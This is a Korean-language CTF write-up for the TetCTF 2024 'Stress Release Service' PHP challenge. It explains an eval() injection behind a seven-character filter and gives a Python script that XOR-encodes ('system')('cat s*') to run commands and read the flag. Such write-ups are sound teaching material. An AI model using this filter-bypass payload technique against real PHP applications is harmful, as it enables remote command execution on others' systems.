---
title: "[TetCTF 2024] Stress Release Service"
date: 2024-02-03 16:32:53
tags:
categories: [Security, CTF]
---

## 개요

> For a better New Year, we are introducing a service that can help you reduce stress.

[chall.zip](/uploads/tet24-stress-release-service/chall.zip)


## 문제 분석

웹페이지에 들어가면 입력 창과 버튼이 하나 있습니다. 버튼을 클릭하면 입력한 내용과 개구리가 함께 출력됩니다.

![1.png](/images/tet24-stress-release-service/1.png)

소스 코드가 제공된 문제로, 플래그는 `secret.php` 에 하드코딩되어 있습니다. 상단에 배포한 파일에는 실제 플래그를 적어놓기는 했지만, 대회 환경에서 배포된 파일에는 가짜 플래그가 적혀 있습니다.

```php
<?php

// Veryyyyyy Secretttttttttttt !!!!!!!!!!!!!!!!!
$FL4ggggggggggg = "TetCTF{*** redacted ***}";

?>
```

`index.php` 를 보면 입력한 내용이 `$voice` 에 대입됩니다. 이후 `validateInput()` 함수의 검증을 통과할 경우 `eval()` 함수의 문자열 인자 중 일부로 전달됩니다. PHP의 `eval()` 함수는 문자열을 코드로 간주하여 실행하는 함수이기 때문에, 임의 코드 실행이 가능한 상황입니다.

```php
if (isset($_GET["shout"]) && !empty($_GET["shout"]) && is_string($_GET["shout"])) {
	$voice = $_GET["shout"];
	$res = "<center><br><br><img src=\"https://i.imgur.com/SvbbT0W.png\" width=5% /> WRONGGGGG WAYYYYYY TOOOO RELEASEEEEE STRESSSSSSSS!!!!!!</center>";
	if(validateInput($voice) === true) {
		eval("\$res='<center><br><br><img src=\"https://i.imgur.com/TL6siVW.png\" width=5% /> ".$voice.".</center>';");
	}

	if (strlen($res) < 300) {
		echo $res;
	} else {
		echo "<center>Too loud!!! Please respect your neighbor.</center>";
	}
}
```

`validateInput()` 함수는 입력이 특수문자로만 이루어져 있는지, 사용한 문자의 종류가 7종을 초과하는지 검사합니다. 즉 이 문제는 특수문자 7종 이하만을 사용한 PHP 코드 작성을 요구하고 있습니다.

```php
function validateInput($input) {
    // To make your shout effective, it shouldn't contain alphabets or numbers.
    $pattern = '/[a-z0-9]/i';
    if (preg_match($pattern, $input)) {
        return false;
    }

    // and only a few characters. Let's make your shout clean.
	$count = count(array_count_values(str_split($input)));
	if ($count > 7) {
		return false;
	}

	return true;
}
```


## 문제 풀이

기존의 특수문자만을 이용한 PHP 코드 실행 문제를 보면 몇 가지 파훼법이 존재합니다. 예를 들어 아래 풀이는 `$_` 변수에 아무 문자열이나 대입한 후, `$_++;` 로 원하는 문자가 나올 때까지 증감 연산을 하는 방법을 사용합니다.

[@preview](https://medium.com/mucomplex/bypass-with-php-non-alpha-encoder-fee4e1bac31e)

그런데 이 문제는 PHP 8.3 버전에서 동작하여 위와 같은 방식을 사용할 수 없습니다. 증감 연산자에 대한 PHP [문서](https://www.php.net/manual/en/language.operators.increment.php)를 보면 8.3 버전부터 문자열에 대한 증감 연산을 더 이상 지원하지 않습니다.

![2.png](/images/tet24-stress-release-service/2.png)

다만 PHP의 논리적 xor 연산자는 문자열 간의 연산을 지원하고 있습니다. `php -a` 로 인터랙티브 셸을 실행하여 확인할 수도 있습니다.

```
Interactive shell

php > echo '(' ^ '\\';
t
```

그렇다면 특수문자 7종 간 xor 연산을 계속하여 코드 실행에 필요한 문자를 모두 얻을 수도 있을 것입니다.

`index.php` 코드를 보면 입력은 `$res = '...` 와 `...';` 사이에 들어갑니다. 따라서 문자열과 코드를 분리하기 위한 `'` 와 `;` 이 필요합니다. 또한 xor과 문자열 덧셈을 위한 `^` 와 `.` , xor 연산식을 감싸기 위한 `(` 와 `)` 를 선택했습니다. 7종을 채우려면 하나가 남는데, 역슬래시 `\\` 를 사용했습니다.

각 알파벳을 가장 적은 횟수의 xor 연산으로 얻는 완전 탐색을 실시하면, 선택한 특수문자 중 최대 6종만으로 모든 문자의 조합이 가능함을 확인할 수 있습니다.

```
{'A': [39, 59, 40, 41, 92],
 'B': [39, 94, 59],
 'C': [39, 94, 59, 40, 41],
...
 'x': [39, 94, 40, 41],
 'y': [39, 94],
 'z': [39, 40, 41, 92]}
```

추가적으로 PHP는 다음과 같이 함수명에 해당하는 문자열을 괄호로 감싸 함수 호출이 가능합니다.

```
Interactive shell

php > system("id");
uid=501(user) gid=1000(user) groups=1000(user)
php >
php > ("system")("id");
uid=501(user) gid=1000(user) groups=1000(user)
```

따라서 `system()` 함수를 호출해 임의 커맨드를 실행할 수 있습니다. 아래 코드는 완전 탐색 후 `("system")("cat s*")` 를 실행하기 위한 특수문자 문자열을 조합합니다.

```python
#!/usr/bin/env python3
from itertools import combinations
from functools import reduce
from operator import xor
import string

tbl = dict()

def gen_table():
    global tbl

    cs = list(map(ord, [b"'", b"^", b";", b"(", b")", b".", b"\\"]))

    for i in range(6, 1, -1):
        for it in combinations(cs, i):
            c = chr(reduce(xor, it))
            if c in string.ascii_letters + " *":
                tbl[c] = list(it)

    return tbl

def rtos(r: list):
    res = "("

    for c in list(map(chr, r)):
        res += "'" + ("\\" if c in ["'", "\\"] else "") + c + "'^"

    return res[:-1] + ")"

def encode(s):
    res = ""

    for i in range(0, len(s)):
        res += rtos(tbl[s[i]]) + "."

    return res[:-1]

def main():
    gen_table()

    f = encode("system")
    a = encode("cat s*")
    print(f"';({f})({a});'")

if __name__ == "__main__":
    main()
```

문자열을 입력하고 버튼을 누르면 개구리 말고 다른 내용은 보이지 않는데, 브라우저의 소스 코드 확인 기능을 이용하면 플래그가 포함되어 있는 것을 확인할 수 있습니다.

![3.png](/images/tet24-stress-release-service/3.png)